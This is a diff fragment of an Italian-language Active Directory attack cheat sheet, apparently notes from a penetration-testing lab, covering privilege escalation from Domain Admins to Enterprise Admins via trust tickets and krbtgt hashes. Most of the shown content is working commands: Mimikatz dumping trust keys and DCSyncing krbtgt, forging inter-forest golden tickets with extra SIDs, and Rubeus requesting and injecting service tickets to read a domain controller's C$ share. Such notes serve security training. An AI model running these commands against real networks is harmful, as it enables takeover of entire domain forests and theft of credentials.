 ### I domini nelle foreste hanno una implicita 2-way trust con altri domini. 2 modi per fare priv esc tra 2 domini in una foresta. Tramite krbtgt hash o Trust tickets
 <img src="Trust_flow_across_forest.png" width="400">
 
-## Trust Flow  with trust tickets
+## Trust Flow with trust tickets
 <img src="Trust_flow_across_forest_1.png" width="400">
 
-### Da un DC  possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519. Possiede l'accesso amministrativo a tutti i domini in una foresta)
+### Da un DC possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519. Possiede l'accesso amministrativo a tutti i domini in una foresta)
 
 ```
 			- powershell -ep bypass
@@ -541,7 +705,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 			- ls \\mcorpdc.moneycorp.local\C$
 ```
 
-## Trust Flow  with krbtgt hash
+## Trust Flow with krbtgt hash
 
 ```
 			- powershell -ep bypass
@@ -558,19 +722,19 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ## Across the Forest usando Trust Ticket
 
 ```
-			- powershell -ep bypass
-			- Import-Module Invoke-Mimikatz.ps1
-			- Get-DomainSID -Domain [dominio di Enterprise Admins]
-			
-			- Invoke-Mimikatz -Command '"lsadump::trust /patch"' (trust key)
-			o
-			- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' (trust key)
-			
-			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID dominio altra foresta] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio altra foresta] /ticket:[PATH dove il ticket verrà salvato] (Inter-forest TGT viene forgiato)
-			
-			- Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/FQDN altra foresta]  /dc: [FQDN controller di dominio di dominio di altra foresta]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
-			- klist (verifico di avere il ticket TGS)
-			- ls \\mcorpdc.moneycorp.local\C$
+powershell -ep bypass
+Import-Module Invoke-Mimikatz.ps1
+- Get-DomainSID -Domain [dominio di Enterprise Admins]
+
+- Invoke-Mimikatz -Command '"lsadump::trust /patch"' (trust key)
+o
+- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' (trust key)
+
+- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID dominio altra foresta] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio altra foresta] /ticket:[PATH dove il ticket verrà salvato] (Inter-forest TGT viene forgiato)
+
+- Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/FQDN altra foresta]  /dc: [FQDN controller di dominio di dominio di altra foresta]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
+- klist (verifico di avere il ticket TGS)
+- ls \\mcorpdc.moneycorp.local\C$
 ```
 
 # DCShadow
